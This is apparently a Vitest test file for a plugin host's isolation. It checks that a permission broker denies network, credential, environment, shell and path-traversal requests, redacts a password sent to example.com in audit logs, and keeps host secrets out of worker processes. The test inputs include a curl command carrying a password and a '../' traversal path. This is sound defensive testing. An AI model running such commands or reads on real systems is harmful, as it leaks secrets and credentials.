import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import {
  DEFAULT_PLUGIN_RESOURCE_LIMITS,
  enforceDiagnosticLimits,
  PermissionBroker,
  PluginHost,
} from "@fuzit/plugin-host";
import type { Diagnostic } from "@fuzit/plugin-sdk";
import type { PluginClient } from "@fuzit/plugin-host";

describe("plugin exfiltration and isolation (V1-118)", () => {
  const directories: string[] = [];
  const clients: PluginClient[] = [];

  afterEach(async () => {
    for (const client of clients.splice(0)) client.kill();
    for (const directory of directories.splice(0))
      await rm(directory, {
        recursive: true,
        force: true,
        maxRetries: 20,
        retryDelay: 100,
      });
  });

  it("denies every unauthorized exfiltration and persistence operation", () => {
    const broker = new PermissionBroker({ workspaceRoot: resolve(".") });
    const decisions = [
      broker.authorize({ kind: "network:connect", host: "example.com" }),
      broker.authorize({ kind: "environment:read", varName: "SECRET_TOKEN" }),
      broker.authorize({ kind: "credentials:read", key: "API_KEY" }),
      broker.authorize({ kind: "filesystem:read", path: "secrets.env" }),
      broker.authorize({ kind: "filesystem:write", path: "stolen.txt" }),
      broker.authorize({ kind: "shell:execute", command: "curl example.com" }),
      broker.authorize({ kind: "runtime:spawnProcess" }),
      broker.authorize({ kind: "persistence:write", key: "index-corruption" }),
      broker.authorize({ kind: "filesystem:read", path: "../outside.txt" }),
    ];

    expect(decisions.every(({ allowed }) => !allowed)).toBe(true);
    expect(broker.getAuditLogs()).toHaveLength(decisions.length);
  });

  it("redacts attacker-controlled values in attributable audit records", () => {
    const broker = new PermissionBroker({ workspaceRoot: resolve(".") });
    broker.authorize({
      kind: "shell:execute",
      command: "curl example.com?password=hunter2",
    });
    const serialized = JSON.stringify(broker.getAuditLogs());
    expect(serialized).not.toContain("hunter2");
    expect(serialized).toContain("[REDACTED]");
  });

  it("does not inherit host credentials into the isolated worker", async () => {
    const directory = await mkdtemp(join(tmpdir(), "fuzit-plugin-env-"));
    directories.push(directory);
    await writeFile(
      join(directory, "fuzit-plugin.json"),
      JSON.stringify({
        schemaVersion: 1,
        id: "com.example.environment-probe",
        name: "Environment Probe",
        version: "1.0.0",
        protocol: "fuzit-plugin-v1",
        fuzitVersion: "^1.0.0",
        entryPoint: "worker.js",
        capabilities: ["parser"],
      }),
    );
    await writeFile(
      join(directory, "worker.js"),
      `import { Buffer } from "node:buffer";
let buffered = Buffer.alloc(0);
function send(message) { const body = Buffer.from(JSON.stringify(message)); const header = Buffer.alloc(4); header.writeUInt32BE(body.length); process.stdout.write(Buffer.concat([header, body])); }
process.stdin.on("data", chunk => { buffered = Buffer.concat([buffered, chunk]); while (buffered.length >= 4) { const size = buffered.readUInt32BE(0); if (buffered.length < size + 4) return; const message = JSON.parse(buffered.subarray(4, size + 4)); buffered = buffered.subarray(size + 4); if (message.type === "handshake_request") send({ requestId: message.requestId, type: "handshake_response", success: true, acceptedCapabilities: ["parser"] }); else if (message.type === "execute_request") send({ requestId: message.requestId, type: "execute_response", success: true, data: Object.keys(process.env).sort() }); } });`,
    );

    process.env.FUZIT_TEST_SECRET = "password=hunter2";
    try {
      const client = await PluginHost.spawnPlugin({ pluginDir: directory });
      clients.push(client);
      const result = await client.executeCapability("parser", {});
      expect(result.success).toBe(true);
      expect(result.data).toEqual(expect.arrayContaining(["NODE_ENV"]));
      expect(result.data).not.toEqual(
        expect.arrayContaining(["FUZIT_TEST_SECRET"]),
      );
    } finally {
      delete process.env.FUZIT_TEST_SECRET;
    }
  });

  it("bounds oversized plugin diagnostics deterministically", () => {
    const diagnostic: Diagnostic = {
      schemaVersion: 1,
      code: "ATTACKER_DIAGNOSTIC",
      severity: "warning",
      source: "fixture",
      message: "bounded",
    };
    const limit = DEFAULT_PLUGIN_RESOURCE_LIMITS.maxDiagnosticsPerRequest;
    const bounded = enforceDiagnosticLimits(
      Array.from({ length: limit + 10 }, () => diagnostic),
    );
    expect(bounded).toHaveLength(limit);
    expect(bounded?.at(-1)?.code).toBe("PLUGIN_DIAGNOSTIC_TRUNCATED");
  });
});
